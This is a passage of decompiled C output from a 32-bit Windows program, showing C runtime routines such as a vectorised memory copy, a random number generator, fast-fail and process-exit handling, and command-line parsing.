                        __asm_movdqa(*(int128_t *)v134, __asm_palignr(v154, v152, 4));
                        int128_t v160 = __asm_movdqa_5(v156); // 0x409596
                        __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v156, v159, 4));
                        v152 = __asm_movdqa_5(v158);
                        __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v158, v160, 4));
                        int32_t v161 = v134 + 48; // 0x4095b4
                        int32_t v162 = v155; // 0x4095b7
                        int32_t v163 = v161; // 0x4095b7
                        while (v155 > 47) {
                            // 0x409570
                            v153 = v157;
                            v154 = __asm_movdqa_5(*(int128_t *)(v153 + 16));
                            v155 = v162 - 48;
                            v156 = __asm_movdqa_5(*(int128_t *)(v153 + 32));
                            v157 = v153 + 48;
                            v158 = __asm_movdqa_5(*(int128_t *)v157);
                            v159 = __asm_movdqa_5(v154);
                            __asm_movdqa(*(int128_t *)v163, __asm_palignr(v154, v152, 4));
                            v160 = __asm_movdqa_5(v156);
                            __asm_movdqa(*(int128_t *)(v163 + 16), __asm_palignr(v156, v159, 4));
                            v152 = __asm_movdqa_5(v158);
                            __asm_movdqa(*(int128_t *)(v163 + 32), __asm_palignr(v158, v160, 4));
                            v161 = v163 + 48;
                            v162 = v155;
                            v163 = v161;
                        }
                        // 0x4095b9
                        v135 = v155;
                        v137 = v153 + 52;
                        v136 = v161;
                    } else {
                        int32_t v164 = v133 - 12; // 0x4094b2
                        int128_t v165 = __asm_movdqa_5(*(int128_t *)v164); // 0x4094ba
                        int32_t v166 = v164;
                        int128_t v167 = __asm_movdqa_5(*(int128_t *)(v166 + 16)); // 0x4094bc
                        int32_t v168 = v132 - 48; // 0x4094c1
                        int128_t v169 = __asm_movdqa_5(*(int128_t *)(v166 + 32)); // 0x4094c4
                        int32_t v170 = v166 + 48; // 0x4094c9
                        int128_t v171 = __asm_movdqa_5(*(int128_t *)v170); // 0x4094c9
                        int128_t v172 = __asm_movdqa_5(v167); // 0x4094d4
                        __asm_movdqa(*(int128_t *)v134, __asm_palignr(v167, v165, 12));
                        int128_t v173 = __asm_movdqa_5(v169); // 0x4094e2
                        __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v169, v172, 12));
                        v165 = __asm_movdqa_5(v171);
                        __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v171, v173, 12));
                        int32_t v174 = v134 + 48; // 0x409500
                        int32_t v175 = v168; // 0x409503
                        int32_t v176 = v174; // 0x409503
                        while (v168 > 47) {
                            // 0x4094bc
                            v166 = v170;
                            v167 = __asm_movdqa_5(*(int128_t *)(v166 + 16));
                            v168 = v175 - 48;
                            v169 = __asm_movdqa_5(*(int128_t *)(v166 + 32));
                            v170 = v166 + 48;
                            v171 = __asm_movdqa_5(*(int128_t *)v170);
                            v172 = __asm_movdqa_5(v167);
                            __asm_movdqa(*(int128_t *)v176, __asm_palignr(v167, v165, 12));
                            v173 = __asm_movdqa_5(v169);
                            __asm_movdqa(*(int128_t *)(v176 + 16), __asm_palignr(v169, v172, 12));
                            v165 = __asm_movdqa_5(v171);
                            __asm_movdqa(*(int128_t *)(v176 + 32), __asm_palignr(v171, v173, 12));
                            v174 = v176 + 48;
                            v175 = v168;
                            v176 = v174;
                        }
                        // 0x409505
                        v135 = v168;
                        v137 = v166 + 60;
                        v136 = v174;
                    }
                }
                int32_t v177 = v135; // 0x4095bf
                int32_t v178 = v137; // 0x4095bf
                int32_t v179 = v136; // 0x4095bf
                if (v135 >= 16) {
                    int128_t v180 = __asm_movdqu_6(*(int128_t *)v137); // 0x4095c1
                    int32_t v181 = v135 - 16; // 0x4095c5
                    int32_t v182 = v137 + 16; // 0x4095c8
                    __asm_movdqa(*(int128_t *)v136, v180);
                    int32_t v183 = v136 + 16; // 0x4095cf
                    int32_t v184 = v183; // 0x4095bf
                    int32_t v185 = v182; // 0x4095bf
                    int32_t v186 = v181; // 0x4095bf
                    while (v181 >= 16) {
                        // 0x4095c1
                        v180 = __asm_movdqu_6(*(int128_t *)v185);
                        v181 = v186 - 16;
                        v182 = v185 + 16;
                        __asm_movdqa(*(int128_t *)v184, v180);
                        v183 = v184 + 16;
                        v184 = v183;
                        v185 = v182;
                        v186 = v181;
                    }
                    // 0x4095bc
                    v177 = v135 & 15;
                    v178 = v182;
                    v179 = v183;
                }
                int32_t v187 = v177; // 0x4095d8
                int32_t v188 = v178; // 0x4095d8
                int32_t v189 = v179; // 0x4095d8
                if ((v177 & 4) != 0) {
                    // 0x4095da
                    *(int32_t *)v179 = *(int32_t *)v178;
                    v187 = v177 - 4;
                    v188 = v178 + 4;
                    v189 = v179 + 4;
                }
                int32_t v190 = v187; // 0x4093e0
                int32_t v191 = v188; // 0x4093e0
                int32_t v192 = v189; // 0x4093e0
                while (true) {
                  lab_0x4095fe:
                    // 0x4095fe
                    g263 = v190;
                    v125 = v191;
                    v121 = v192;
                    v126 = v191;
                    v122 = v192;
                    v127 = v191;
                    v123 = v192;
                    switch (v190) {
                        case 0: {
                            return result;
                        }
                        case 1: {
                            goto lab_0x40965c;
                        }
                        case 2: {
                            goto lab_0x409668;
                        }
                        case 3: {
                            goto lab_0x40967c;
                        }
                        default: {
                            // 0x4095ed
                            __asm_movq_2(*(int64_t *)v192, __asm_movq(*(int64_t *)v191));
                            v190 -= 8;
                            v191 += 8;
                            v192 += 8;
                            goto lab_0x4095fe;
                        }
                    }
                }
                // 0x409654
                return result;
            }
            goto lab_0x409622;
        }
    }
  lab_0x409607:
    // 0x409607
    v120 = a3;
    v128 = a2;
    v124 = result;
    if ((result & 3) != 0) {
        *(char *)result = *(char *)a2;
        int32_t v193 = a3 - 1; // 0x409613
        int32_t v194 = a2 + 1; // 0x409614
        int32_t v195 = result + 1; // 0x409617
        int32_t v196 = v193; // 0x409620
        int32_t v197 = v194; // 0x409620
        int32_t v198 = v195; // 0x409620
        v120 = v193;
        v128 = v194;
        v124 = v195;
        while ((v195 & 3) != 0) {
            // 0x40960f
            *(char *)v198 = *(char *)v197;
            v193 = v196 - 1;
            v194 = v197 + 1;
            v195 = v198 + 1;
            v196 = v193;
            v197 = v194;
            v198 = v195;
            v120 = v193;
            v128 = v194;
            v124 = v195;
        }
    }
    goto lab_0x409622;
  lab_0x4098b1:
    // 0x4098b1
    v61 = v64;
    v62 = v66;
    v63 = v65;
    if (v64 >= 32) {
        int128_t v203 = __asm_movdqu_6(*(int128_t *)v66); // 0x4098c0
        int128_t v204 = __asm_movdqu_6(*(int128_t *)(v66 + 16)); // 0x4098c4
        __asm_movdqu(*(int128_t *)v65, v203);
        __asm_movdqu(*(int128_t *)(v65 + 16), v204);
        int32_t v205 = v66 + 32; // 0x4098d2
        int32_t v206 = v65 + 32; // 0x4098d5
        int32_t v207 = v64 / 32 - 1; // 0x4098d8
        int32_t v208 = v207; // 0x4098d9
        int32_t v209 = v205; // 0x4098d9
        int32_t v210 = v206; // 0x4098d9
        v61 = v64;
        v62 = v205;
        v63 = v206;
        while (v207 != 0) {
            // 0x4098c0
            v203 = __asm_movdqu_6(*(int128_t *)v209);
            v204 = __asm_movdqu_6(*(int128_t *)(v209 + 16));
            __asm_movdqu(*(int128_t *)v210, v203);
            __asm_movdqu(*(int128_t *)(v210 + 16), v204);
            v205 = v209 + 32;
            v206 = v210 + 32;
            v207 = v208 - 1;
            v208 = v207;
            v209 = v205;
            v210 = v206;
            v61 = v64;
            v62 = v205;
            v63 = v206;
        }
    }
    goto lab_0x4098db;
  lab_0x409622:;
    uint32_t v199 = v120 / 4; // 0x40962d
    __asm_rep_movsd_memcpy((char *)v124, (char *)v128, v199);
    bool v200; // 0x4093e0
    int32_t v201 = v124 + v199 * (v200 ? -4 : 4); // 0x409630
    int32_t v202 = v120 & 3; // 0x409632
    g264 = v202;
    v125 = v201;
    v121 = v201;
    v126 = v201;
    v122 = v201;
    v127 = v201;
    v123 = v201;
    switch (v202) {
        case 0: {
            // 0x409654
            return result;
        }
        case 1: {
          lab_0x40965c:
            // 0x40965c
            *(char *)v121 = *(char *)v125;
            return result;
        }
        case 2: {
          lab_0x409668:
            // 0x409668
            *(char *)v122 = *(char *)v126;
            *(char *)(v122 + 1) = *(char *)(v126 + 1);
            return result;
        }
        case 3: {
          lab_0x40967c:
            // 0x40967c
            *(char *)v123 = *(char *)v127;
            *(char *)(v123 + 1) = *(char *)(v127 + 1);
            *(char *)(v123 + 2) = *(char *)(v127 + 2);
            return result;
        }
    }
    // 0x4098db2
    // UNREACHABLE
}

// Address range: 0x409954 - 0x4099d7
int32_t function_409954(int32_t a1, int32_t a2) {
    // 0x409954
    int32_t result; // 0x409954
    char * v1 = (char *)(result + 12); // 0x40995f
    *v1 = 0;
    if (a1 != 0) {
        // 0x409967
        *(int32_t *)(result + 4) = *(int32_t *)a1;
        // 0x409987
        *(int32_t *)(result + 8) = *(int32_t *)(a1 + 4);
        // 0x4099d0
        return result;
    }
    // 0x409971
    if (g199 == 0) {
        // 0x40997a
        *(int32_t *)(result + 4) = *(int32_t *)0x4261d0;
        // 0x409987
        *(int32_t *)(result + 8) = (int32_t)g123;
        // 0x4099d0
        return result;
    }
    int32_t v2 = function_40bfb3(); // 0x40998d
    int32_t v3 = result + 4; // 0x409992
    *(int32_t *)result = v2;
    int32_t v4 = result + 8; // 0x409998
    *(int32_t *)v3 = *(int32_t *)(v2 + 76);
    int32_t v5 = *(int32_t *)(v2 + 72); // 0x4099a0
    *(int32_t *)v4 = v5;
    function_40c102(v2, v3);
    function_40c12f(v5, v4);
    int32_t * v6 = (int32_t *)(v5 + 848); // 0x4099b8
    int32_t v7 = *v6; // 0x4099b8
    if ((v7 & 2) == 0) {
        // 0x4099c3
        *v6 = v7 | 2;
        *v1 = 1;
    }
    // 0x4099d0
    return result;
}

// Address range: 0x4099d7 - 0x4099f8
int32_t function_4099d7(void) {
    int32_t * v1 = (int32_t *)(function_40bfb3() + 24); // 0x4099dc
    uint32_t v2 = 0x343fd * *v1 + 0x269ec3; // 0x4099e3
    *v1 = v2;
    return v2 / 0x10000 & 0x7fff;
}

// Address range: 0x4099f8 - 0x409a29
int32_t function_4099f8(int32_t a1) {
    // 0x4099f8
    uint32_t v1; // 0x4099f8
    int32_t result = (bool)(v1 < 0xfffffffc);
    if (v1 >= 0xfffffffc) {
        // 0x409a24
        return result;
    }
    int32_t v2 = 0; // 0x409a15
    v2++;
    int32_t v3; // 0x4099f8
    *(int32_t *)v3 = a1;
    v3 += 4;
    while (v2 != result) {
        // 0x409a1a
        v2++;
        *(int32_t *)v3 = a1;
        v3 += 4;
    }
    // 0x409a24
    return result;
}

// Address range: 0x409a29 - 0x409b64
int32_t function_409a29(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    if (a2 != -1) {
        // 0x409a45
        function_406b24(a2);
    }
    // 0x409a4e
    int32_t v1; // bp-804, 0x409a29
    int32_t v2 = &v1; // 0x409a58
    function_407730(v2, 0, 80);
    int32_t v3; // bp-724, 0x409a29
    function_407730((int32_t)&v3, 0, 716);
    int32_t ExceptionInfo = v2; // bp-812, 0x409a7a
    v3 = 0x10001;
    v1 = a3;
    bool v4 = IsDebuggerPresent(); // 0x409b21
    SetUnhandledExceptionFilter(NULL);
    if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo) != 0) {
        // 0x409b55
        return function_406b2c();
    }
    if (a2 != -1 && !v4) {
        // 0x409b4c
        function_406b24(a2);
    }
    // 0x409b55
    return function_406b2c();
}

// Address range: 0x409b64 - 0x409b65
int32_t function_409b64(int32_t a1, int32_t a2) {
    // 0x409b64
    int32_t result; // 0x409b64
    return result;
}

// Address range: 0x409b66 - 0x409b78
int32_t function_409b66(int32_t a1) {
    // 0x409b66
    return function_4099f8(a1);
}

// Address range: 0x409b78 - 0x409c03
int32_t function_409b78(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = function_40c037(); // 0x409b89
    if (v1 != 0) {
        // 0x409b92
        if (*(int32_t *)(v1 + 860) != 0) {
            // 0x409bab
            function_406b3d();
            return function_406b2c();
        }
    }
    int32_t v2 = g185 ^ g112; // 0x409bd5
    uint32_t v3 = g112 & 31; // 0x409bdb
    int32_t v4 = v2; // 0x409be1
    if (v3 != 0) {
        v4 = v2 >> v3 | v2 << 32 - v3;
    }
    if (v4 != 0) {
        // 0x409bab
        function_406b3d();
        return function_406b2c();
    }
    // 0x409bed
    function_409c20();
    __asm_int3();
    return function_409b78(0, 0, 0, 0, 0);
}

// Address range: 0x409c03 - 0x409c20
int32_t function_409c03(void) {
    // 0x409c03
    function_409b78(0, 0, 0, 0, 0);
    function_409c20();
    return __asm_int3();
}

// Address range: 0x409c20 - 0x409c53
int32_t function_409c20(void) {
    // 0x409c20
    if (IsProcessorFeaturePresent(23)) {
        // 0x409c2b
        __asm_int(41);
    }
    // 0x409c30
    int32_t v1; // 0x409c20
    function_409a29(2, -0x3ffffbe9, 1, v1);
    return TerminateProcess(GetCurrentProcess(), (int32_t)&g266);
}

// Address range: 0x409c53 - 0x409c5e
int32_t function_409c53(void) {
    // 0x409c53
    return function_40c196((int32_t)&g266);
}

// Address range: 0x409c5e - 0x409c5f
int32_t function_409c5e(int32_t a1) {
    // 0x409c5e
    int32_t result; // 0x409c5e
    return result;
}

// Address range: 0x409c60 - 0x409c72
int32_t function_409c60(int32_t a1) {
    // 0x409c60
    return function_4099f8(a1);
}

// Address range: 0x409c72 - 0x409cb6
int32_t function_409c72(int32_t a1) {
    // 0x409c72
    int32_t v1; // bp-4, 0x409c72
    int32_t v2; // 0x409c72
    int32_t v3; // 0x409c72
    if (function_409cb6(v2, g112 ^ (int32_t)&v1, v3) != 0) {
        // 0x409c8e
        function_406b3d();
    }
    // 0x409ca7
    return function_406b2c();
}

// Address range: 0x409cb6 - 0x409cfc
int32_t function_409cb6(int32_t a1, int32_t a2, int32_t a3) {
    // 0x409cb6
    function_406cf0(&g87, 12, (int32_t)&g266);
    int32_t v1; // 0x409cb6
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x409cc2
    *v2 = 0;
    function_40c527(0);
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x409cce
    *v3 = 0;
    uint32_t v4 = g112 & 31; // 0x409cda
    int32_t v5 = g186 ^ g112; // 0x409cdd
    int32_t v6 = v5; // 0x409ce3
    if (v4 != 0) {
        v6 = v5 >> v4 | v5 << 32 - v4;
    }
    *v2 = v6;
    *v3 = -2;
    function_409cff();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x409cf6
    return result;
}

// Address range: 0x409cff - 0x409d08
int32_t function_409cff(void) {
    // 0x409cff
    return function_40c56f(0);
}

// Address range: 0x409d08 - 0x409e7b
int32_t function_409d08(int32_t a1, int32_t a2) {
    int32_t v1 = function_40c037(); // 0x409d1a
    if (v1 == 0) {
        // 0x409e6c
        return function_406b2c();
    }
    int32_t v2 = *(int32_t *)v1; // 0x409d29
    int32_t v3 = v2 + 132;
    int32_t v4 = v2;
    int32_t * v5 = (int32_t *)v4;
    while (*v5 != a1) {
        // 0x409d42
        if (v4 == v3) {
            // 0x409e6c
            return function_406b2c();
        }
        v4 += 12;
        v5 = (int32_t *)v4;
    }
    if (v4 == 0) {
        // 0x409e6c
        return function_406b2c();
    }
    int32_t * v6 = (int32_t *)(v4 + 8); // 0x409d4f
    int32_t v7 = *v6; // 0x409d4f
    if (v7 == 0) {
        // 0x409e6c
        return function_406b2c();
    }
    if (v7 == 5) {
        // 0x409d62
        *v6 = 0;
        // 0x409e6c
        return function_406b2c();
    }
    if (v7 == 1) {
        // 0x409e6c
        return function_406b2c();
    }
    int32_t * v8 = (int32_t *)(v1 + 4); // 0x409d76
    int32_t v9 = *v8; // 0x409d76
    *v8 = a2;
    if (*(int32_t *)(v4 + 4) != 8) {
        // 0x409e50
        *v6 = 0;
        function_406b3d();
        // 0x409e60
        *v8 = v9;
        // 0x409e6c
        return function_406b2c();
    }
    int32_t v10 = v2 + 36;
    *(int32_t *)(v10 + 8) = 0;
    while (v10 != v3) {
        // 0x409d94
        v10 += 12;
        *(int32_t *)(v10 + 8) = 0;
    }
    int32_t * v11 = (int32_t *)(v1 + 8); // 0x409d9e
    uint32_t v12 = *v5; // 0x409da6
    if (v12 < 0xc0000092) {
        switch (v12) {
            case -0x3fffff6f: {
                // 0x409df0
                *v11 = 132;
                // break -> 0x409e3b
                break;
            }
            case -0x3fffff73: {
                // 0x409de7
                *v11 = 130;
                // break -> 0x409e3b
                break;
            }
            case -0x3fffff72: {
                // 0x409dde
                *v11 = 131;
                // break -> 0x409e3b
                break;
            }
            case -0x3fffff71: {
                // 0x409dd5
                *v11 = 134;
                // break -> 0x409e3b
                break;
            }
            default: {
                if (v12 == -0x3fffff70) {
                    // 0x409dcc
                    *v11 = 129;
                }
                // break -> 0x409e3b
                break;
            }
        }
    } else {
        switch (v12) {
            case -0x3fffff6e: {
                // 0x409e34
                *v11 = 138;
                // break -> 0x409e3b
                break;
            }
            case -0x3fffff6d: {
                // 0x409e2b
                *v11 = 133;
                // break -> 0x409e3b
                break;
            }
            case -0x3ffffd4c: {
                // 0x409e22
                *v11 = 142;
                // break -> 0x409e3b
                break;
            }
            default: {
                if (v12 == -0x3ffffd4b) {
                    // 0x409e19
                    *v11 = 141;
                }
                // break -> 0x409e3b
                break;
            }
        }
    }
    // 0x409e3b
    function_406b3d();
    // 0x409e60
    *v8 = v9;
    // 0x409e6c
    return function_406b2c();
}

// Address range: 0x409e7b - 0x409e9a
int32_t function_409e7b(uint32_t a1) {
    uint32_t v1 = -g112 & 31; // 0x409e90
    int32_t v2 = a1; // 0x409e90
    if (v1 != 0) {
        v2 = a1 << 32 - v1 | a1 >> v1;
    }
    return v2 ^ g112;
}

// Address range: 0x409e9a - 0x409ead
int32_t function_409e9a(int32_t a1) {
    // 0x409e9a
    return (bool)(a1 == -0x1f928c9d);
}

// Address range: 0x409ead - 0x409f9c
int32_t function_409ead(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = &g88; // bp-8, 0x409eaf
    function_411940(&g88, 12, (int32_t)&g266);
    int32_t v2; // 0x409ead
    int32_t v3 = *(int32_t *)(v2 + 16); // 0x409eb9
    int32_t v4; // bp-12, 0x409ead
    if (v3 == 0) {
        // 0x409ec0
        if ((char)function_40a007() != 0) {
            int32_t v5 = *(int32_t *)(v2 + 8); // 0x409ec9
            v4 = v5;
            function_40a04b(v5);
        }
    }
    // 0x409ed2
    v4 = 2;
    function_40c527(2);
    int32_t v6 = &v1; // 0x409ed9
    int32_t * v7 = (int32_t *)(v2 - 4); // 0x409eda
    *v7 = 0;
    int32_t v8; // 0x409ead
    if (g189 != 0) {
        // 0x409f84
        *v7 = -2;
        function_409fb7();
        v8 = v6;
        if (v3 == 0) {
            // 0x409f94
            *(int32_t *)(v6 - 4) = *(int32_t *)(v2 + 8);
            function_409fc6((int32_t)&g266);
            // UNREACHABLE
        }
    } else {
        // 0x409eeb
        g187 = 1;
        *v7 = 1;
        int32_t v9 = *(int32_t *)(v2 + 12); // 0x409efc
        int32_t v10; // 0x409ead
        if (v9 != 0) {
            if (v9 != 1) {
                // 0x409f4f
                *v7 = 0;
                v10 = v6;
            } else {
                // 0x409f4f
                v4 = &g195;
                function_40a9b3();
                *v7 = 0;
                v10 = (int32_t)&v4 + 4;
            }
        } else {
            // 0x409f03
            v4 = 32;
            int32_t v11 = v6; // 0x409f21
            if (g188 != g112) {
                // 0x409f23
                v4 = 0;
                int32_t v12 = 0; // bp-20, 0x409f29
                function_406b3d();
                v11 = &v12;
            }
            int32_t * v13 = (int32_t *)(v11 - 4);
            *v13 = (int32_t)&g194;
            function_40a9b3();
            *v7 = 0;
            *v13 = (int32_t)&g9;
            *(int32_t *)(v11 - 8) = (int32_t)&g8;
            function_40ac39(&g266, &g266);
            v10 = v11;
        }
        // 0x409f68
        *(int32_t *)(v10 - 4) = (int32_t)&g11;
        *(int32_t *)(v10 - 8) = (int32_t)&g10;
        function_40ac39(&g266, &g266);
        if (v3 == 0) {
            // 0x409f84
            g189 = 1;
            *v7 = -2;
            function_409fb7();
            // 0x409f94
            *(int32_t *)(v10 - 4) = *(int32_t *)(v2 + 8);
            function_409fc6((int32_t)&g266);
            // UNREACHABLE
        }
        // 0x409f84
        *v7 = -2;
        function_409fb7();
        v8 = v10;
    }
    function_409fc0();
    // 0x409f94
    *(int32_t *)(v8 - 4) = *(int32_t *)(v2 + 8);
    function_409fc6((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x409f9c - 0x409fac
int32_t function_409f9c(void) {
    // 0x409f9c
    int32_t v1; // 0x409f9c
    return function_409e9a(*(int32_t *)*(int32_t *)*(int32_t *)(v1 - 20));
}

// Address range: 0x409fb7 - 0x409fc0
int32_t function_409fb7(void) {
    // 0x409fb7
    return function_40c56f(2);
}

// Address range: 0x409fc0 - 0x409fc6
int32_t function_409fc0(void) {
    // 0x409fc0
    return function_411989();
}

// Address range: 0x409fc6 - 0x40a006
int32_t function_409fc6(int32_t a1) {
    // 0x409fc6
    int32_t v1; // bp-4, 0x409fc6
    int32_t v2 = &v1; // 0x409fc8
    int32_t v3 = v2; // 0x409fd2
    int32_t v4; // 0x409fc6
    if ((char)function_40c964(v4) != 0) {
        int32_t v5 = *(int32_t *)(__readfsdword(48) + 104); // 0x409fda
        v3 = v2;
        if ((v5 & 256) == 0) {
            int32_t * processHandle = GetCurrentProcess(); // 0x409fe7
            int32_t v6 = (int32_t)processHandle; // bp-12, 0x409fed
            TerminateProcess(processHandle, (int32_t)&g266);
            v3 = &v6;
        }
    }
    int32_t * v7 = (int32_t *)(v3 - 4); // 0x409ff4
    *v7 = a1;
    function_40a04b((int32_t)&g266);
    *v7 = a1;
    ExitProcess((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x40a007 - 0x40a04b
int32_t function_40a007(void) {
    int32_t * v1 = GetModuleHandleW(NULL); // 0x40a009
    int32_t v2 = (int32_t)v1; // 0x40a009
    if (v1 == NULL) {
        // 0x40a015
        return v2 & -256;
    }
    // 0x40a018
    if (*(int16_t *)v1 != 0x5a4d) {
        // 0x40a015
        return 0x5a00;
    }
    int32_t v3 = *(int32_t *)(v2 + 60) + v2; // 0x40a025
    if (*(int32_t *)v3 != 0x4550 || *(int16_t *)(v3 + 24) != 267 || *(int32_t *)(v3 + 116) < 15) {
        // 0x40a015
        return v3 & -256;
    }
    // 0x40a040
    return v3 & -256 | (int32_t)(*(int32_t *)(v3 + 232) != 0);
}

// Address range: 0x40a04b - 0x40a0b5
int32_t function_40a04b(int32_t a1) {
    int32_t phModule = 0; // bp-12, 0x40a05c
    int32_t v1 = 0; // bp-24, 0x40a069
    bool v2 = GetModuleHandleExW(0, L"mscoree.dll", (int32_t **)&phModule); // 0x40a06b
    int32_t v3 = &v1; // 0x40a073
    if (v2) {
        int32_t v4 = phModule; // bp-36, 0x40a07b
        int32_t (*func)() = GetProcAddress((int32_t *)phModule, "CorExitProcess"); // 0x40a07e
        int32_t * v5 = &v4; // 0x40a088
        if (func != NULL) {
            int32_t v6 = a1; // bp-40, 0x40a08a
            function_406b3d();
            v5 = &v6;
        }
        // 0x40a097
        v3 = (int32_t)v5 + 4;
    }
    // 0x40a098
    if (phModule != 0) {
        // 0x40a09e
        *(int32_t *)(v3 - 4) = phModule;
        FreeLibrary(&g266);
    }
    // 0x40a0a7
    return function_406b2c();
}

// Address range: 0x40a0b5 - 0x40a0b6
int32_t function_40a0b5(int32_t a1) {
    // 0x40a0b5
    int32_t result; // 0x40a0b5
    return result;
}

// Address range: 0x40a0b7 - 0x40a0c4
int32_t function_40a0b7(int32_t result) {
    // 0x40a0b7
    g188 = result;
    return result;
}

// Address range: 0x40a0c4 - 0x40a0cf
int32_t function_40a0c4(void) {
    // 0x40a0c4
    function_409ead(0, 2, 1);
    // UNREACHABLE
}

// Address range: 0x40a0cf - 0x40a0d3
int32_t function_40a0cf(void) {
    // 0x40a0cf
    int32_t result; // 0x40a0cf
    return result;
}

// Address range: 0x40a0d3 - 0x40a0de
int32_t function_40a0d3(void) {
    // 0x40a0d3
    function_409ead(0, 0, 1);
    // UNREACHABLE
}

// Address range: 0x40a0de - 0x40a0e2
int32_t function_40a0de(void) {
    // 0x40a0de
    int32_t result; // 0x40a0de
    return result;
}

// Address range: 0x40a0e2 - 0x40a0f3
int32_t function_40a0e2(int32_t a1) {
    // 0x40a0e2
    function_409ead(a1, 2, 0);
    // UNREACHABLE
}

// Address range: 0x40a0f3 - 0x40a0f8
int32_t function_40a0f3(int32_t a1) {
    // 0x40a0f3
    int32_t result; // 0x40a0f3
    return result;
}

// Address range: 0x40a0f8 - 0x40a130
int32_t function_40a0f8(int32_t a1) {
    // 0x40a0f8
    if (g188 != g112) {
        function_40ae16();
        // UNREACHABLE
    }
    int32_t result = function_409e7b(a1); // 0x40a123
    g188 = result;
    return result;
}

// Address range: 0x40a130 - 0x40a141
int32_t function_40a130(int32_t a1) {
    // 0x40a130
    function_409ead(a1, 0, 0);
    // UNREACHABLE
}

// Address range: 0x40a141 - 0x40a146
int32_t function_40a141(int32_t a1) {
    // 0x40a141
    int32_t result; // 0x40a141
    return result;
}

// Address range: 0x40a146 - 0x40a26a
int32_t function_40a146(int32_t a1) {
    if ((uint32_t)(a1 - 1) >= 2) {
        // 0x40a15b
        *(int32_t *)function_40b091() = 22;
        // 0x40a265
        return 22;
    }
    // 0x40a171
    function_40d406();
    GetModuleFileNameA(NULL, (char *)&g190, 260);
    g226 = (char *)&g190;
    int32_t v1; // 0x40a146
    if (g224 == NULL) {
        // 0x40a1a1
        v1 = (int32_t)&g190;
        goto lab_0x40a1a3;
    } else {
        // 0x40a19c
        v1 = (int32_t)g224;
        if (*g224 != 0) {
            goto lab_0x40a1a3;
        } else {
            // 0x40a1a1
            v1 = (int32_t)&g190;
            goto lab_0x40a1a3;
        }
    }
  lab_0x40a1a3:;
    int32_t v2 = 0; // bp-8, 0x40a1a6
    int32_t v3 = 0; // bp-16, 0x40a1ad
    function_40a26a(v1, 0, 0, &v2, &v3);
    int32_t v4 = function_40a3df(v2, v3, 1); // 0x40a1c1
    int32_t result; // 0x40a146
    int32_t v5; // 0x40a146
    if (v4 != 0) {
        // 0x40a1db
        function_40a26a(v1, v4, 4 * v2 + v4, &v2, &v3);
        if (a1 != 1) {
            int32_t v6 = 0; // bp-12, 0x40a213
            int32_t v7 = function_40cf21(v4, &v6); // 0x40a218
            int32_t v8 = v6;
            int32_t v9 = v8; // 0x40a223
            int32_t v10 = v7; // 0x40a223
            if (v7 == 0) {
                int32_t v11 = 0; // 0x40a233
                if (*(int32_t *)v8 != 0) {
                    int32_t v12 = v8 + 4; // 0x40a235
                    int32_t v13 = 1; // 0x40a238
                    int32_t v14 = v12; // 0x40a23b
                    int32_t v15 = v13; // 0x40a23b
                    v11 = v13;
                    while (*(int32_t *)v12 != 0) {
                        // 0x40a235
                        v12 = v14 + 4;
                        v13 = v15 + 1;
                        v14 = v12;
                        v15 = v13;
                        v11 = v13;
                    }
                }
                // 0x40a23d
                g221 = v11;
                v6 = 0;
                g222 = v8;
                v9 = 0;
                v10 = 0;
            }
            // 0x40a250
            function_40c15c(v9);
            v6 = 0;
            result = v10;
            v5 = v4;
        } else {
            // 0x40a1fa
            g221 = v2 - 1;
            g222 = v4;
            result = 0;
            v5 = 0;
        }
    } else {
        // 0x40a1cf
        *(int32_t *)function_40b091() = 12;
        result = 12;
        v5 = v4;
    }
    // 0x40a25a
    function_40c15c(v5);
    // 0x40a265
    return result;
}

// Address range: 0x40a26a - 0x40a3df
int32_t function_40a26a(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5) {
    // 0x40a26a
    *a5 = 0;
    *a4 = 1;
    int32_t v1 = 0; // 0x40a28d
    if (a2 != 0) {
        // 0x40a28f
        *(int32_t *)a2 = a3;
        v1 = a2 + 4;
    }
    // 0x40a297
    int32_t v2; // bp-20, 0x40a26a
    int32_t * v3 = (int32_t *)((int32_t)&v2 - 4);
    char v4 = 0; // 0x40a299
    int32_t v5 = 0; // 0x40a299
    int32_t v6 = a1; // 0x40a299
    int32_t v7 = a3; // 0x40a299
    int32_t v8; // 0x40a26a
    int32_t v9; // 0x40a26a
    int32_t v10; // 0x40a26a
    int32_t v11; // 0x40a26a
    while (true) {
        int32_t v12 = v7;
        int32_t v13 = v6;
        char * v14 = (char *)v13; // 0x40a29c
        char v15; // 0x40a26a
        int32_t v16; // 0x40a26a
        int32_t v17; // 0x40a26a
        int32_t v18; // 0x40a26a
        char v19; // 0x40a26a
        if (*v14 != 34) {
            // 0x40a2ae
            *a5 = *a5 + 1;
            int32_t v20 = 0; // 0x40a2b2
            if (v12 != 0) {
                // 0x40a2b4
                *(char *)v12 = *v14;
                v20 = v12 + 1;
            }
            int32_t v21 = v20;
            char v22 = *v14; // 0x40a2b9
            int32_t v23 = v13 + 1; // 0x40a2bb
            int32_t v24 = v22; // 0x40a2bf
            *v3 = v24;
            int32_t v25 = v23; // 0x40a2cb
            int32_t v26 = v21; // 0x40a2cb
            if (function_40d791(v24) != 0) {
                // 0x40a2cd
                *a5 = *a5 + 1;
                int32_t v27 = 0; // 0x40a2d1
                if (v21 != 0) {
                    // 0x40a2d3
                    *(char *)v21 = *(char *)v23;
                    v27 = v21 + 1;
                }
                // 0x40a2d8
                v25 = v13 + 2;
                v26 = v27;
            }
            // 0x40a2d9
            v8 = v26;
            v10 = v25;
            if (v22 == 0) {
                // break -> 0x40a2f9
                break;
            }
            // 0x40a2e0
            v19 = v4;
            v15 = v22;
            v16 = v4;
            v18 = v10;
            v17 = v8;
        } else {
            // 0x40a2a1
            v19 = v5 == 0;
